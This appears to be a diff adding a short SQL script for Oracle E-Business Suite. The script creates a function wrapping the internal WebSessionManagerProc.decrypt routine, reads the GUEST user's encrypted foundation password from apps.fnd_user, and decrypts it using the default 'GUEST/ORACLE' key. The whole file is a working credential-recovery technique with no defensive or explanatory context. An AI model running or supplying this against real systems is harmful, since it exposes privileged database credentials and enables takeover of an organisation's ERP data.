@@ -1,0 +1,11 @@
+     create FUNCTION apps.decrypt_pin_func(in_chr_key IN VARCHAR2,in_chr_encrypted_pin IN VARCHAR2)
+     RETURN VARCHAR2
+     AS
+    LANGUAGE JAVA NAME 'oracle.apps.fnd.security.WebSessionManagerProc.decrypt(java.lang.String,java.lang.String) return java.lang.String';
+    
+    -----------
+    
+    select ENCRYPTED_FOUNDATION_PASSWORD from apps.fnd_user where USER_NAME='GUEST';
+    
+    ------------
+     SELECT apps.decrypt_pin_func('GUEST/ORACLE','ZH9063099E268A5E872932A101D1A868C72E06217224543286E4EF2D04822114BFF3212F00610F040FA843C550BDFF7C0F92') from dual;
